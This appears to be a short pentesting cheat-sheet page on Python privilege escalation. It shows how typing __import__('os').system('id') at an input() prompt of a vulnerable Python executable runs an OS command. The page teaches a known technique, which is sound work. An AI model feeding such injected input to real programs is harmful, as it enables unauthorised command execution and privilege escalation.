---
title: Python PrivEsc
desc: 
tags: [Python, PrivEsc, Privilege]
alts: [IPython-PrivEsc]
render_with_liquid: false
---

## OS Commands in input()

If you find the executable which is created in Python.  
For instance,

```sh
./executable

Enter some input:
```

You can enter OS commands in some input.

```py
__import__('os').system('id')
```

For example,

```sh
./executable

Enter some input: __import__('os').system('id')
```